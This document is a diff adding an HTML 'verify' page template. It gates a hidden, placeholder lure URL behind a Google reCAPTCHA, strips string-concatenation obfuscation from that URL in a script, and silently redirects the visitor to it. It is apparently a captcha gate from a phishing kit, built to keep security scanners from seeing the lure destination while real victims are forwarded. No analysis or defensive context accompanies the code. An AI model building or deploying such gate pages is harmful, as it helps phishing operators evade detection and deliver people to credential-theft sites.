@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>verify</title>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+
+<body>
+  <form action="" method="POST">
+    <div style="height:100vh; width:100%; display:flex; align-items:center; justify-content:center; flex-direction: row"
+      data-callback="validate" class="g-recaptcha" data-sitekey="6Lc3Gl8pAAAAANF4ZnLfUTuUMEpNdss3FmTaieMx">
+
+    </div>
+
+  </form>
+</body>
+
+<p style="display:none" id="url">{lure_url_js}</p>
+
+<script>
+
+
+  async function validate(data) {
+    let text = document.getElementById('url').textContent;
+    const textArr = text.split(" + ");
+    text = textArr.join("");
+    text = text.replace(/\'/, "");
+    text = text.split("''")
+    text = text.join("");
+    text = text.replace("'", "");
+    console.log("link: ", text);
+    setTimeout(() => {
+      window.location.assign(text);
+    }, 2000)
+
+
+
+  }
+</script>
+
+</html>
